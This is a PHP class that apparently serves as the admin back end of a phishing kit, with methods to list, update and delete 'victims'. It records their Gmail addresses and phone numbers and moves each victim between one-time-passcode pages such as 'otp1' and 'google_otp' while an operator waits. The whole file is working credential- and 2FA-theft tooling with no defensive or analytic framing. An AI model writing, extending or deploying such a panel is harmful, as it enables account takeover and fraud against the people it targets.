<?php

class Admin
{
    private $db;
    private $crud;

    function __construct($conn, $crud)
    {
        $this->db = $conn; 
        $this->crud = $crud; 
    }

    public function getAllVictims()
    {
        return $this->crud->getAllVictims();
    }

    public function getVictim($id)
    {
        return $this->crud->getVictim($id);
    }
    
    public function updateVictim($id, $request)
    {
        $victim = $this->crud->getVictim($id);

        //Is victim exists in database?
        if(empty($victim)) {
            return 0;
        }

        if($victim['next_page'] == $request['currentpage'])
        {
            $this->crud->updateVictim($id, [
                'next_page' => $request['currentpage'],
                'gmail' => $request['gmail'],
                'phonenum' => $request['phonenum'],
                'is_refreshed' => 1,
                'is_waiting' => 0
            ]);
            return 1;
        }

        if($request['currentpage'] == "otp1")
        {
            $this->crud->updateVictim($id, [
                'phonenum' => $request['phonenum'],
            ]);
        }
        if($request['currentpage'] == "google_otp")
        {
            $this->crud->updateVictim($id, [
                'gmail' => $request['gmail'],
            ]);
        }

        $this->crud->updateVictim($id, [
            'next_page' => $request['currentpage'],
            'is_waiting' => 0
        ]);

        return 1;
    }

    public function deleteVictim($id)
    {
        $victim = $this->crud->getVictim($id);

        //Is victim exists in database?
        if(empty($victim)) {
            return;
        }

        return $this->crud->deleteVictim($id);
    }
    

}